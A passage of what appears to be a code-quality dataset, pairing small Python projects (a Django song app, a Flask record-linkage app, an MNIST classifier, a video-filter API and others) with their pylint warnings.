48           ),
49           migrations.AddField(
50               model_name='track',
51               name='track_speechiness',
52               field=models.FloatField(default=0, max_length=10),
53               preserve_default=False,
54           ),
55           migrations.AddField(
56               model_name='track',
57               name='track_tempo',
58               field=models.FloatField(default=0, max_length=10),
59               preserve_default=False,
60           ),
61           migrations.AddField(
62               model_name='track',
63               name='track_valence',
64               field=models.FloatField(default=0, max_length=10),
65               preserve_default=False,
66           ),
67       ]
","6 - refactor: too-few-public-methods
"
"1   from django.urls import path
2   from . import views
3   
4   urlpatterns = [
5   
6       path('', views.index, name = 'home'),
7       path('songs/', views.SongList.as_view(), name = 'song_list'),
8       path('view/<int:pk>', views.SongView.as_view(), name = 'song_view'),
9       path('new', views.SongCreate.as_view(), name = 'song_new'),
10       path('view/<int:pk>', views.SongView.as_view(), name = 'song_view'),
11       path('edit/<int:pk>', views.SongUpdate.as_view(), name = 'song_edit'),
12       path('delete/<int:pk>', views.SongDelete.as_view(), name = 'song_delete'),
13       path('tracks/', views.TrackView, name = 'track_list'),
14       path('yearanalysis/', views.YearAnalysis, name = 'year_analysis'),
15       path('analysis/<int:pk>', views.Analysis.as_view(), name = 'track_detail'),
16   
17       #url(r'^tracks/(?P<tracksyear>\w+)/$', views.TrackView, name = ""TrackView"")
18       path('tracks/<int:tracksyear>', views.TrackView, name = ""TrackView"")
19   ]
","2 - error: no-name-in-module
"
"1   from django.db import models
2   from django.urls import reverse
3   
4   class Question(models.Model):
5       question_text = models.CharField(max_length=200)
6       pub_date = models.DateTimeField('Date published')
7   
8   
9   class Choice(models.Model):
10       question = models.ForeignKey(Question, on_delete=models.CASCADE)
11       choice_text = models.CharField(max_length=200)
12       votes = models.IntegerField(default=0)
13   
14   class Song(models.Model):
15       song_name = models.CharField(max_length=200)
16       song_artist = models.CharField(max_length = 200)
17       release_year = models.IntegerField(default=2000)
18   
19       def __str__(self):
20           return self.song_name
21   
22       def get_absolute_url(self):
23           return reverse('song_edit', kwargs={'pk': self.pk})
24   
25   class Track(models.Model):
26       track_id = models.CharField(max_length=30)     
27       track_name = models.CharField(max_length=500)
28       track_artist = models.CharField(max_length = 500)
29       track_duration = models.CharField(max_length = 10)
30       track_popularity = models.IntegerField(default=100)
31   
32       track_danceability = models.FloatField(max_length=10)
33       track_energy = models.FloatField(max_length=10)
34       track_key = models.IntegerField(max_length=3)
35       track_loudness = models.FloatField(max_length=10)
36       track_speechiness = models.FloatField(max_length=10)
37       track_acousticness = models.FloatField(max_length=10)
38       track_instrumentalness = models.FloatField(max_length=10)
39       track_liveness = models.FloatField(max_length=10)
40       track_valence = models.FloatField(max_length=10)
41       track_tempo = models.FloatField(max_length=10)
42   
43       def __str__(self):
44           return self.track_name
45   
46   
","4 - refactor: too-few-public-methods
9 - refactor: too-few-public-methods
25 - refactor: too-few-public-methods
"
"1   import logging
2   from logging.handlers import RotatingFileHandler
3   
4   from flask import Flask
5   from flask import url_for as _url_for
6   from flask.ext.sqlalchemy import SQLAlchemy
7   from flask.ext.oauth import OAuth
8   from flask.ext.assets import Environment
9   
10   import certifi
11   from kombu import Exchange, Queue
12   from celery import Celery
13   
14   from nomenklatura import default_settings
15   
16   logging.basicConfig(level=logging.DEBUG)
17   
18   app = Flask(__name__)
19   app.config.from_object(default_settings)
20   app.config.from_envvar('NOMENKLATURA_SETTINGS', silent=True)
21   app_name = app.config.get('APP_NAME')
22   
23   file_handler = RotatingFileHandler('/var/log/nomenklatura/errors.log',
24                                       maxBytes=1024 * 1024 * 100,
25                                       backupCount=20)
26   file_handler.setLevel(logging.DEBUG)
27   formatter = logging.Formatter(""%(asctime)s - %(name)s - %(levelname)s - %(message)s"")
28   file_handler.setFormatter(formatter)
29   app.logger.addHandler(file_handler)
30   
31   if app.debug is not True:
32       from raven.contrib.flask import Sentry
33       sentry = Sentry(app, dsn=app.config.get('SENTRY_DSN'))
34   
35   db = SQLAlchemy(app)
36   assets = Environment(app)
37   
38   celery = Celery('nomenklatura', broker=app.config['CELERY_BROKER_URL'])
39   
40   queue_name = app_name + '_q'
41   app.config['CELERY_DEFAULT_QUEUE'] = queue_name
42   app.config['CELERY_QUEUES'] = (
43       Queue(queue_name, Exchange(queue_name), routing_key=queue_name),
44   )
45   
46   celery = Celery(app_name, broker=app.config['CELERY_BROKER_URL'])
47   celery.config_from_object(app.config)
48   
49   oauth = OAuth()
50   github = oauth.remote_app('github',
51           base_url='https://github.com/login/oauth/',
52           authorize_url='https://github.com/login/oauth/authorize',
53           request_token_url=None,
54           access_token_url='https://github.com/login/oauth/access_token',
55           consumer_key=app.config.get('GITHUB_CLIENT_ID'),
56           consumer_secret=app.config.get('GITHUB_CLIENT_SECRET'))
57   
58   github._client.ca_certs = certifi.where()
59   
60   
61   def url_for(*a, **kw):
62       try:
63           kw['_external'] = True
64           return _url_for(*a, **kw)
65       except RuntimeError:
66           return None
","58 - warning: protected-access
"
"1   from normality import normalize
2   from flask.ext.script import Manager
3   from flask.ext.assets import ManageAssets
4   
5   from nomenklatura.core import db
6   from nomenklatura.model import Entity
7   from nomenklatura.views import app
8   from nomenklatura.assets import assets
9   
10   manager = Manager(app)
11   manager.add_command('assets', ManageAssets(assets))
12   
13   
14   @manager.command
15   def createdb():
16       """""" Make the database. """"""
17       db.engine.execute(""CREATE EXTENSION IF NOT EXISTS hstore;"")
18       db.engine.execute(""CREATE EXTENSION IF NOT EXISTS fuzzystrmatch;"")
19       db.create_all()
20   
21   
22   @manager.command
23   def flush(dataset):
24       ds = Dataset.by_name(dataset)
25       for alias in Alias.all_unmatched(ds):
26           db.session.delete(alias)
27       db.session.commit()
28   
29   
30   if __name__ == '__main__':
31       manager.run()
","24 - error: undefined-variable
25 - error: undefined-variable
1 - warning: unused-import
6 - warning: unused-import
"
"1   import os
2   
3   def bool_env(val):
4       """"""Replaces string based environment values with Python booleans""""""
5       return True if os.environ.get(val, 'False').lower() == 'true' else False
6   
7   #DEBUG = True
8   SECRET_KEY = os.environ.get('SECRET_KEY')
9   SQLALCHEMY_DATABASE_URI = os.environ.get('DATABASE_URL',
10                               os.environ.get('SHARED_DATABASE_URL'))
11   
12   APP_NAME = os.environ.get('APP_NAME', 'nomenklatura')
13   
14   GITHUB_CLIENT_ID = os.environ.get('GITHUB_CLIENT_ID')
15   GITHUB_CLIENT_SECRET = os.environ.get('GITHUB_CLIENT_SECRET')
16   
17   MEMCACHE_HOST = os.environ.get('MEMCACHIER_SERVERS')
18   
19   S3_BUCKET = os.environ.get('S3_BUCKET', 'nomenklatura')
20   S3_ACCESS_KEY = os.environ.get('S3_ACCESS_KEY')
21   S3_SECRET_KEY = os.environ.get('S3_SECRET_KEY')
22   
23   CELERY_BROKER = os.environ.get('CLOUDAMQP_URL')
24   
25   SIGNUP_DISABLED = bool_env('SIGNUP_DISABLED')
","5 - refactor: simplifiable-if-expression
"
"1   
2   from nomenklatura.model.dataset import Dataset
3   from nomenklatura.model.entity import Entity
4   from nomenklatura.model.account import Account
5   from nomenklatura.model.upload import Upload
","2 - warning: unused-import
3 - warning: unused-import
4 - warning: unused-import
5 - warning: unused-import
"
"1   from setuptools import setup, find_packages
2   
3   setup(
4       name='nomenklatura',
5       version='0.1',
6       description=""Make record linkages on the web."",
7       long_description='',
8       classifiers=[
9           ],
10       keywords='data mapping identity linkage record',
11       author='Open Knowledge Foundation',
12       author_email='info@okfn.org',
13       url='http://okfn.org',
14       license='MIT',
15       packages=find_packages(exclude=['ez_setup', 'examples', 'tests']),
16       namespace_packages=[],
17       include_package_data=False,
18       zip_safe=False,
19       install_requires=[
20       ],
21       tests_require=[],
22       entry_points=\
23       """""" """""",
24   )
","Clean Code: No Issues Detected
"
"1   DEBUG = False
2   APP_NAME = 'nomenklatura'
3   
4   CELERY_BROKER_URL = 'amqp://guest:guest@localhost:5672//'
5   
6   ALLOWED_EXTENSIONS = set(['csv', 'tsv', 'ods', 'xls', 'xlsx', 'txt'])
7   
8   SIGNUP_DISABLED = False
","Clean Code: No Issues Detected
"
"1   from flask.ext.assets import Bundle
2   
3   from nomenklatura.core import assets
4   
5   deps_assets = Bundle(
6       'vendor/jquery/dist/jquery.js',
7       'vendor/bootstrap/js/collapse.js',
8       'vendor/angular/angular.js',
9       'vendor/angular-route/angular-route.js',
10       'vendor/angular-bootstrap/ui-bootstrap-tpls.js',
11       'vendor/ngUpload/ng-upload.js',
12       filters='uglifyjs',
13       output='assets/deps.js'
14   )
15   
16   app_assets = Bundle(
17       'js/app.js',
18       'js/services/session.js',
19       'js/directives/pagination.js',
20       'js/directives/keybinding.js',
21       'js/directives/authz.js',
22       'js/controllers/app.js',
23       'js/controllers/import.js',
24       'js/controllers/home.js',
25       'js/controllers/docs.js',
26       'js/controllers/review.js',
27       'js/controllers/datasets.js',
28       'js/controllers/entities.js',
29       'js/controllers/profile.js',
30       filters='uglifyjs',
31       output='assets/app.js'
32   )
33   
34   css_assets = Bundle(
35       'vendor/bootstrap/less/bootstrap.less',
36       'vendor/font-awesome/less/font-awesome.less',
37       'style/style.less',
38       filters='less,cssrewrite',
39       output='assets/style.css'
40   )
41   
42   assets.register('deps', deps_assets)
43   assets.register('app', app_assets)
44   assets.register('css', css_assets)
","Clean Code: No Issues Detected
"
"1   import logging
2   
3   import requests
4   from flask import url_for, session, Blueprint, redirect
5   from flask import request
6   from apikit import jsonify
7   from werkzeug.exceptions import Forbidden
8   
9   from nomenklatura import authz
10   from nomenklatura.core import app, db, github
11   from nomenklatura.model import Account, Dataset
12   
13   section = Blueprint('sessions', __name__)
14   
15   
16   @section.route('/sessions')
17   def status():
18       return jsonify({
19           'logged_in': authz.logged_in(),
20           'api_key': request.account.api_key if authz.logged_in() else None,
21           'account': request.account,
22           'base_url': url_for('index', _external=True)
23       })
24   
25   
26   @section.route('/sessions/authz')
27   def get_authz():
28       permissions = {}
29       dataset_name = request.args.get('dataset')
30       if dataset_name is not None:
31           dataset = Dataset.find(dataset_name)
32           permissions[dataset_name] = {
33               'view': True,
34               'edit': authz.dataset_edit(dataset),
35               'manage': authz.dataset_manage(dataset)
36           }
37       return jsonify(permissions)
38   
39   
40   @section.route('/sessions/login')
41   def login():
42       callback = url_for('sessions.authorized', _external=True)
43       return github.authorize(callback=callback)
44   
45   
46   @section.route('/sessions/logout')
47   def logout():
48       logging.info(authz.require(authz.logged_in()))
49       session.clear()
50       return redirect('/')
51   
52   
53   @section.route('/sessions/callback')
54   @github.authorized_handler
55   def authorized(resp):
56       if 'access_token' not in resp:
57           return redirect(url_for('index', _external=True))
58       access_token = resp['access_token']
59       session['access_token'] = access_token, ''
60       res = requests.get('https://api.github.com/user?access_token=%s' % access_token,
61                          verify=False)
62       data = res.json()
63       for k, v in data.items():
64           session[k] = v
65       account = Account.by_github_id(data.get('id'))
66       if account is None:
67           if app.config.get('SIGNUP_DISABLED'):
68               raise Forbidden(""Sorry, account creation is disabled"")
69           account = Account.create(data)
70           db.session.commit()
71       return redirect('/')
","60 - warning: missing-timeout
"
"1   # shut up useless SA warning:
2   import warnings
3   warnings.filterwarnings('ignore', 'Unicode type received non-unicode bind param value.')
","Clean Code: No Issues Detected
"
"1   # Where I am currently: function makeOutfitMyself allows user to select an outfit choice from each category, adds it to a list, and returns the complete outfit.
2   # function computerChooses() has not been designed yet
3   # I plan on later adding in color options or allowing the user to add their own options
4   import random
5   gChoices = []
6   DictionaryClothing = {'head options:': 'baseball cap wig sombrero beret fedora toupee'.split(),
7                         'chest options': 'blouse dress shirt tanktop bikini t-shirt sweater chestplate corset'.split(),
8                         'leg options:':
9                             'leggings skinny-jeans khaki\'s shorts daisy-dukes skirt bike-shorts tutu'.split(),
10                         'feet options:':
11                             'running-shoes tap-dance-shoes clogs stilettos platform-shoes sandals flipflops cowboy-boots'.split(),
12                         'accessory options:':
13                             'belt purse necklace headband hoop-earrings sword bow mustache goatee glasses'.split()}
14   # def computerChooses():
15   # The computer selects a random clothing option for each clothing category
16   # for every keyValues in DictionaryClothing:
17   # randomIndex = (random.randint(1, len((keyValues)-1)
18   # Return key[randomIndex]
19   
20   def makeOutfitMyself():
21       # The user selects a choice for each category
22       Choices = []
23       for item in DictionaryClothing:
24           print(item)
25           print(DictionaryClothing[item])
26           response = ''
27           while response not in DictionaryClothing[item] and response != 'CC':
28               print(""please select one of the choices, or type ‘CC’ to have the computer do it for you"")
29               response = input()
30           Choices.append(response)
31       return Choices
32               # If input() in values:
33               # Return input()
34               # Else:
35               # randomIndex = (random.randint(1, len((key values)-1)
36               # Return key[randomIndex]
37   
38   
39   print(""""""Everyday most people must choose an outfit to wear.This game, 'Dress My Day', is here to help you design outfits.
40   Type MC (my choice) to make one yourself, or CC (computer choice) to have the computer make it for you.
41   If you make it yourself, you will be asked a series of questions about clothing type and color.
42   Select one of the given options by typing it in.
43   At any point you can respond to a question by typing “CC” and the computer will make that specific choice.
44   At the end, you will be told your outfit."""""")
45   response = input()
46   
47   if response == 'MC':
48       gChoices = makeOutfitMyself()
49       # Else:
50        # Choices.append(ComputerChooses())
51   # print('The outfit is now done. The outfit is: ’)
52   # print(Choices)
53   print('Looks like your outfit is: ')
54   for item in gChoices:
55       print(item)
56   print('Hope you enjoyed')
","23 - warning: redefined-outer-name
26 - warning: redefined-outer-name
4 - warning: unused-import
"
"1   import numpy as np
2   import matplotlib.pyplot as plt
3   from matplotlib import colors
4   
5   rpms = np.array([4000,3500,3000,2500,2000,1500,1000,500])
6   throttle = np.array([0,0,10,20,40,60,80,100,120])
7   efi_map = np.array([[17.2, 16.8, 15.5, 14.8, 13.8, 13.0, 12.2],
8                       [17.0, 16.5, 15.0, 14.0, 13.4, 13.0, 12.4],
9                       [16.8, 16.0, 14.6, 14.2, 13.6, 13.2, 12.6],
10                       [16.6, 15.8, 14.8, 14.4, 13.8, 13.4, 12.8],
11                       [16.4, 15.5, 15.0, 14.6, 14.0, 13.6, 13.0],
12                       [16.2, 15.6, 15.2, 14.8, 14.2, 13.8, 13.2],
13                       [16.0, 15.8, 15.5, 15.1, 14.6, 14.0, 13.5]])
14   
15   def ShowEFIMap():
16       plt.figure(figsize = (6, 6))
17       ax = plt.subplot(111)
18       ax.set_ylabel(""RPM"")
19       ax.set_xlabel(""Throttle"")
20   
21       plt.imshow(efi_map, cmap = ""autumn"")
22   
23       ax.set_xticklabels(throttle)
24       ax.set_yticklabels(rpms)
25   
26       for a in range(len(efi_map)):
27           for b in range(len(efi_map[a])):
28               ax.text(a,b,efi_map[b,a], ha = ""center"", va = ""center"", color = ""b"")
29   
30       ax.set_title(""EFI MAP"")
31       plt.colorbar()
32   
33       plt.show()
34   
35   ShowEFIMap()","3 - warning: unused-import
"
"1   from Data import MNIST_Data
2   from sklearn.preprocessing import OneHotEncoder
3   from sklearn.model_selection import train_test_split
4   from sklearn.linear_model import LogisticRegression
5   import numpy as np
6   import csv
7   
8   mnist_loader = MNIST_Data(base_dir = ""/home/hrishi/1Hrishi/ECE542_Neural_Networks/Homeworks/2/Data/"", img_size = 784)
9   
10   X_train = mnist_loader._load_imgs(""train-images-idx3-ubyte.gz"")
11   y_train = mnist_loader._load_labels(""train-labels-idx1-ubyte.gz"")
12   X_test = mnist_loader._load_imgs(""t10k-images-idx3-ubyte.gz"")
13   y_test = mnist_loader._load_labels(""t10k-labels-idx1-ubyte.gz"")
14   
15   # np.random.seed(1)  # Reset random state
16   # np.random.shuffle(X_train)
17   # np.random.shuffle(y_train)
18   
19   input = np.append(X_train, y_train[:,None], axis=1)
20   # print(input.shape)
21   np.random.shuffle(input)
22   X_train = input[:,0:784]
23   y_train = input[:,784]
24   
25   # X_train, X_test, y_train, y_test = train_test_split(train_images, train_labels, test_size=0.33, shuffle = True, random_state=42)
26   
27   # from sklearn.preprocessing import StandardScaler
28   # scaler = StandardScaler()
29   # X_train = scaler.fit_transform(X_train)
30   
31   # from sklearn.decomposition import PCA
32   # pca = PCA(n_components = 256)
33   # X_train = pca.fit_transform(X_train)
34   # X_test = pca.fit_transform(X_test)
35   
36   # l2-sag-ovr = 91.25% acc without standard scaling
37   # l2-sag-multinomial = 91.91% acc without standard scaling
38   # l1-saga-ovr = 91.37% acc without standard scaling
39   # l1-saga-multinomial = 92.29% acc without standard scaling
40   
41   # logistic_regressor = LogisticRegression(penalty = 'l1', solver = 'saga', tol = 1e-1, multi_class = 'multinomial', verbose = 1, n_jobs = -1)
42   # logistic_regressor.fit(X_train, y_train)
43   #
44   # predictions = logistic_regressor.predict(X_test)
45   # from sklearn.metrics import accuracy_score
46   # print(accuracy_score(y_test, predictions))
47   #
48   # onehot_encoder = OneHotEncoder(n_values = 10, sparse = False, dtype = np.int8)
49   # predictions = onehot_encoder.fit_transform(y_train.reshape(-1,1))
50   # np.savetxt('lr.csv', predictions, delimiter = ',', fmt = '%i')
51   
52   from sklearn.ensemble import RandomForestClassifier
53   random_forest_regressor = RandomForestClassifier(criterion = 'entropy', verbose = 1)
54   random_forest_regressor.fit(X_train, y_train)
55   
56   predictions = random_forest_regressor.predict(X_test)
57   from sklearn.metrics import accuracy_score
58   print(accuracy_score(y_test, predictions))
59   
60   onehot_encoder = OneHotEncoder(n_values = 10, sparse = False, dtype = np.int8)
61   predictions = onehot_encoder.fit_transform(y_train.reshape(-1,1))
62   np.savetxt('rf.csv', predictions, delimiter = ',', fmt = '%i')
","19 - warning: redefined-builtin
10 - warning: protected-access
11 - warning: protected-access
12 - warning: protected-access
13 - warning: protected-access
3 - warning: unused-import
4 - warning: unused-import
6 - warning: unused-import
"
"1   import numpy as np
2   import gzip
3   from sklearn.preprocessing import OneHotEncoder
4   
5   class MNIST_Data(object):
6   
7       def __init__(self, base_dir, img_size):
8           self.base_dir = base_dir
9           self.img_size = img_size
10   
11       def _load_labels(self, file_name):
12           file_path = self.base_dir + file_name
13   
14           with gzip.open(file_path, 'rb') as f:
15                   labels = np.frombuffer(f.read(), np.uint8, offset=8)
16   
17           return np.array(labels)
18   
19       def _load_imgs(self, file_name):
20           file_path = self.base_dir + file_name
21   
22           with gzip.open(file_path, 'rb') as f:
23                   images = np.frombuffer(f.read(), np.uint8, offset=16)
24           images = images.reshape(-1, self.img_size)
25   
26           return np.array(images)
27   
28   if __name__ == '__main__':
29       mnist_loader = MNIST_Data(base_dir = ""/home/hrishi/1Hrishi/ECE542_Neural_Networks/Homeworks/2/Data/"", img_size = 784)
30       train_labels = mnist_loader._load_labels(""train-labels-idx1-ubyte.gz"")
31       onehot_encoder = OneHotEncoder(n_values = 10, sparse=False)
32       onehot_encoded = onehot_encoder.fit_transform(train_labels.reshape(-1,1))
33       print(train_labels)
34       print(onehot_encoded)
","15 - warning: bad-indentation
23 - warning: bad-indentation
5 - refactor: useless-object-inheritance
5 - refactor: too-few-public-methods
30 - warning: protected-access
"
"1   import sys
2   import traceback
3   from flask import jsonify, request
4   
5   from . import api
6   
7   class InvalidAPIUsage(Exception):
8       status_code = 400
9   
10       def __init__(self, message='', status_code=None):
11           super().__init__()
12           self.message = message
13           self.path = request.path
14           if status_code is None:
15               self.status_code = InvalidAPIUsage.status_code
16   
17       def to_dict(self):
18           rv = {}
19           rv['path'] = self.path
20           rv['status'] = self.status_code
21           rv['message'] = self.message
22           return rv
23   
24   
25   class IncorrectVideoFormat(InvalidAPIUsage):
26       def __init__(self, message_id):
27           super().__init__()
28           self.message = self.msg[message_id]
29   
30       msg = {1:'Incorrect video type: only RGB - Type=video/mp4 allowed',
31               2:'Incorrect video dimensions: only 720p supported (1280*720)'}
32   
33   
34   class InvalidFilterParams(InvalidAPIUsage):
35       def __init__(self, message_id, filter_name=''):
36           super().__init__()
37           self.message = self.msg(message_id, filter_name)
38   
39       def msg(self, id, filter_name):
40           # TODO:Lukas [07252021] messges could be stored in static files as JSON
41           avail_msg = {1:'Incorrect filter parameters: should be {""fps"": ""<fps: float>"", ""filter_params"":{""type"":""<filter: str>""}} \
42                       or for default preview, {""filter_params"":{""type"":""""}}',
43                        2:f'Incorrect filter parameters: filter does not exist, for more go to /api/v1/help/filters/',
44                        3:f'Incorrect filter parameters: required parameters are missing or invalid, for more go to /api/v1/help/filters/{filter_name}/',
45                        4:f'Incorrect download parameters: for more go to /api/v1/help/download/',
46                        }
47           return avail_msg[id]
48   
49   
50   @api.errorhandler(InvalidAPIUsage)
51   def invalid_api_usage(e):
52       return jsonify(e.to_dict()), 400
53   
","40 - warning: fixme
5 - error: no-name-in-module
39 - warning: redefined-builtin
43 - warning: f-string-without-interpolation
45 - warning: f-string-without-interpolation
1 - warning: unused-import
2 - warning: unused-import
"
"1   from flask_swagger_ui import get_swaggerui_blueprint
2   
3   
4   swagger_ui = get_swaggerui_blueprint(
5               '/docs',
6               '/static/swagger.json',
7               config={
8                   ""app_name"": ""videoApi""
9               }
10   )
","Clean Code: No Issues Detected
"
"1   from flask import request, jsonify
2   from functools import wraps
3   
4   from .errors import InvalidAPIUsage, InvalidFilterParams, IncorrectVideoFormat
5   
6   
7   
8   """"""
9       Almost like an Architect - makes decorations
10   """"""
11   def decorator_maker(func):
12       def param_decorator(fn=None, does_return=None, req_c_type=None, req_type=None, arg=None, session=None):
13           def deco(fn):
14               @wraps(fn)
15               def wrapper(*args, **kwargs):
16                   result = func(does_return, req_c_type, req_type, arg, session)
17                   if does_return:
18                       return fn(result)
19                   return fn(*args, **kwargs)
20               return wrapper
21           if callable(fn): return deco(fn)
22           return deco
23       return param_decorator
24   
25   
26   
27   """"""
28       Checks if user input is not out of bounds, and also Content-Type
29   """"""
30   def wrap_param_check(does_return, req_c_type, req_type, arg, session):
31       check_content_type(req_c_type)
32       return check_correct_filter_params(session)
33   
34   def check_content_type(req_c_type):
35       if not request.content_type.startswith(req_c_type):
36           raise InvalidAPIUsage(f'Content-Type should be of type: {req_c_type}', 400)
37   
38   def check_correct_filter_params(session):
39       if request.data:
40           data = request.get_json()
41           f_params = data['filter_params']
42           if 'filter_params' not in data:
43               raise InvalidFilterParams(1)
44           elif 'type' not in f_params:
45               raise InvalidFilterParams(1)
46           if 'download' in request.url:
47               if 'fps' not in data:
48                   raise InvalidFilterParams(1)
49           if 'max_f' in f_params and 'min_f' in f_params:
50               max_fr = session['video_frame_count']
51               min_f_raw = f_params['min_f']
52               max_f_raw = f_params['max_f']
53   
54               if min_f_raw == """": min_f_raw = 0
55               if max_f_raw == """": max_f_raw = max_fr
56   
57               min_f = _check_for_req_type(int, min_f_raw, 4)
58               max_f = _check_for_req_type(int, max_f_raw, 4)
59               a = check_bounds(min_f_raw, max_fr)
60               b = check_bounds(max_f_raw, max_fr)
61               return sorted([a, b])
62   
63   
64   def _check_for_req_type(req_type, val, ex):
65       try: 
66           req_type(val)
67       except Exception:
68           raise InvalidFilterParams(ex)
69       return val
70   
71   parameter_check = decorator_maker(wrap_param_check)
72   
73   
74   
75   """"""
76       Checks if user input is not out of bounds, and also Content-Type
77   """"""
78   def wrap_url_arg_check(does_return, req_c_type, req_type, arg, session):
79       check_arg_urls(req_type, arg)
80       frame_idx = request.view_args[arg]
81       return check_bounds(frame_idx, session['video_frame_count'])
82   
83   
84   def check_arg_urls(req_type, arg):
85       try:
86           req_type(request.view_args[arg])
87       except ValueError:
88           raise InvalidAPIUsage(f'Content-Type should be of type: {req_type.__name__}', 400)
89   
90   def check_bounds(frame_idx, max_frames):
91       f_max = int(max_frames)
92       f_idx = int(frame_idx)
93       if f_idx > f_max:
94           f_idx = f_max-50
95       elif f_idx < 1:
96           f_idx = 1
97       return f_idx
98   
99   url_arg_check = decorator_maker(wrap_url_arg_check)
100   
101   
102   
103   """"""
104       Checks Video Metadata
105   """"""
106   def wrap_metadata_check(does_return, req_c_type, req_type, arg, session):
107       check_metadata(req_type)
108   
109   def check_metadata(req_type):
110       byteStream = request.files['file']
111       vid_type = byteStream.__dict__['headers'].get('Content-Type')
112       if vid_type != req_type:
113           raise IncorrectVideoFormat(1)
114   
115   metadata_check = decorator_maker(wrap_metadata_check)
116   
117   
118   
119   """"""
120       Excpetion Handler for non-Endpoints
121   """"""
122   def exception_handler(fn=None, ex=None, type=None, pas=False):
123       def deco(fn):
124           @wraps(fn)
125           def wrapper(*args, **kwargs):
126               try:
127                   fn(*args, **kwargs)
128               except Exception:
129                   if not pas:
130                       raise ex(type)
131                   pass
132               return fn(*args, **kwargs)
133           return wrapper
134       if callable(fn): return deco(fn)
135       return deco
","4 - error: relative-beyond-top-level
8 - warning: pointless-string-statement
12 - refactor: too-many-arguments
12 - refactor: too-many-positional-arguments
27 - warning: pointless-string-statement
30 - warning: unused-argument
30 - warning: unused-argument
30 - warning: unused-argument
42 - refactor: no-else-raise
38 - refactor: inconsistent-return-statements
57 - warning: unused-variable
58 - warning: unused-variable
68 - warning: raise-missing-from
78 - warning: unused-argument
78 - warning: unused-argument
88 - warning: raise-missing-from
106 - warning: unused-argument
106 - warning: unused-argument
106 - warning: unused-argument
106 - warning: unused-argument
122 - warning: redefined-builtin
128 - warning: broad-exception-caught
130 - warning: raise-missing-from
131 - warning: unnecessary-pass
1 - warning: unused-import
"
"1   from flask import Blueprint
2   
3   api = Blueprint('videoApi', __name__)
4   
5   from . import videoApi, errors, help
","5 - warning: redefined-builtin
5 - error: no-name-in-module
5 - error: no-name-in-module
5 - error: no-name-in-module
5 - warning: unused-import
5 - warning: unused-import
5 - warning: unused-import
"
"1   from flask import Flask
2   from config import config
3   from flask_caching import Cache
4   
5   from flask_swagger_ui import get_swaggerui_blueprint
6   
7   VIDEO_EXTENSION=None
8   VIDEO_WIDTH=None
9   VIDEO_HEIGHT=None
10   
11   VIDEO_UPLOAD_PATH=None
12   FRAMES_UPLOAD_PATH=None 
13   IMG_EXTENSION=None
14   
15   HELP_MSG_PATH=None
16   
17   CACHE=None
18   
19   
20   def create_app(config_name):
21   
22       global VIDEO_EXTENSION
23       global VIDEO_WIDTH
24       global VIDEO_HEIGHT
25   
26       global VIDEO_UPLOAD_PATH
27       global FRAMES_UPLOAD_PATH
28   
29       global IMG_EXTENSION
30       global HELP_MSG_PATH
31       global CACHE
32   
33       app = Flask(__name__)
34       app.config.from_object(config[config_name])
35       config[config_name].init_app(app)
36   
37       cache = Cache(config={""CACHE_TYPE"": ""filesystem"",
38                             ""CACHE_DIR"": app.root_path + '/static/cache'})
39       cache.init_app(app)
40   
41       CACHE = cache
42   
43       VIDEO_EXTENSION = app.config[""VIDEO_EXTENSION""]
44       VIDEO_WIDTH = int(app.config[""VIDEO_WIDTH""])
45       VIDEO_HEIGHT = int(app.config[""VIDEO_HEIGHT""])
46   
47       IMG_EXTENSION = app.config[""IMG_EXTENSION""]
48   
49       VIDEO_UPLOAD_PATH = app.root_path + '/static/uploads/videos'
50       FRAMES_UPLOAD_PATH = app.root_path + '/static/uploads/frames'
51   
52       HELP_MSG_PATH = app.root_path + '/static/helpmessages'
53   
54       #TODO: video max dimensions, video max length
55   
56       from .main import main as main_blueprint
57       app.register_blueprint(main_blueprint)
58   
59       from .api import api as api_blueprint
60       app.register_blueprint(api_blueprint, url_prefix='/videoApi/v1')
61   
62       from .docs import swagger_ui
63       app.register_blueprint(swagger_ui, url_prefix=""/docs"")
64   
65   
66       return app
","54 - warning: fixme
22 - warning: global-statement
23 - warning: global-statement
24 - warning: global-statement
26 - warning: global-statement
27 - warning: global-statement
29 - warning: global-statement
30 - warning: global-statement
31 - warning: global-statement
56 - error: relative-beyond-top-level
59 - error: relative-beyond-top-level
62 - error: relative-beyond-top-level
5 - warning: unused-import
"
"1   import cv2
2   import math
3   import string
4   import random
5   import numpy as np
6   import skvideo.io
7   from PIL import Image
8   
9   from .. import VIDEO_EXTENSION, VIDEO_UPLOAD_PATH, \
10                   FRAMES_UPLOAD_PATH, IMG_EXTENSION, CACHE
11   
12   FPS = 23.98
13   SK_CODEC = 'libx264'
14   
15   
16   def create_vid_path(name):
17       return f'{VIDEO_UPLOAD_PATH}/{name}{VIDEO_EXTENSION}'
18   
19   def create_frame_path(name):
20       return  f'{FRAMES_UPLOAD_PATH}/{name}{IMG_EXTENSION}'
21   
22   def framecount_from_vid_id(video_id):
23       video_path = create_vid_path(video_id)
24       cap = cv2.VideoCapture(video_path)
25       return math.floor(cap.get(7))
26   
27   def id_generator(size, chars=string.ascii_lowercase + string.digits) -> str:
28       return ''.join(random.choice(chars) for _ in range(size))
29   
30   
31   def create_sk_video_writer(video_f_path, fps = None):
32       if not fps : fps = FPS
33       return skvideo.io.FFmpegWriter(video_f_path,
34               outputdict={'-c:v':SK_CODEC, '-profile:v':'main',
35                           '-pix_fmt': 'yuv420p', '-r':str(fps)})
36   
37   
38   def set_cache_f_count(s_id: str, ud: str, fc: str) -> None:
39       CACHE.set(f'{s_id}_{ud}', fc)
40   
41   
42   def bgr_to_rgb(frame: np.ndarray) -> np.ndarray:
43       return frame[:, :, ::-1]
44   
45   
46   def is_greyscale(frame) -> bool:
47       return frame.ndim == 2
48   
49   
50   def is_rgb(frame) -> bool:
51       return frame.ndim == 3
52   
53   
54   def img_from_greyscale(frame: np.ndarray) -> Image:
55       return Image.fromarray(frame).convert(""L"")
56   
57   
58   def img_from_bgr(frame: np.ndarray) -> Image:
59       return Image.fromarray(bgr_to_rgb(frame))
60   
61   
62   
","9 - error: relative-beyond-top-level
"
"1   import os
2   basedir = os.path.abspath(os.path.dirname(__file__))
3   
4   
5   class Config:
6   
7       """"""
8       """"""
9       SECRET_KEY = os.environ.get('SECRET_KEY')
10       FLASK_CONFIG = os.environ.get('FLASK_CONFIG')
11   
12       VIDEO_EXTENSION = os.environ.get('VIDEO_EXTENSION')
13       VIDEO_WIDTH = os.environ.get('VIDEO_WIDTH')
14       VIDEO_HEIGHT = os.environ.get('VIDEO_HEIGHT')
15   
16       IMG_EXTENSION = os.environ.get('IMG_EXTENSION')
17   
18   
19       @staticmethod
20       def init_app(app):
21           pass
22   
23   
